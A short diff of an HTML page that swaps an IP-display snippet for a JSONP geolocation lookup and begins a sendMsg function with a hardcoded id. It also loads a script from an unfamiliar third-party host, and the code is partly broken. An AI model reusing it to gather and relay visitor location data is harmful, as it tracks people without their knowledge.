@@ -4,12 +4,11 @@
 	<script src="https://harfeto.timefriend.net/vendor/jquery.js"></script> 
 	        <script src= "https://cdnjs.cloudflare.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
 <body>
-	<span>Your IP address is: </span>
-	<p class="ip"></p>
 <script>
-        $.getJSON(" https://api64.ipify.org?format=json, function (data) {
-    $(".ip ").text(data); 
-  });
+	$.getJSON('http://gd.geobytes.com/GetCityDetails?callback=?', function(data) {
+		console.log(JSON.stringify(data, null, 2));
+		alert(data);
+	});
         var id = "16965075642233";
         function sendMsg() {
             var text = data;
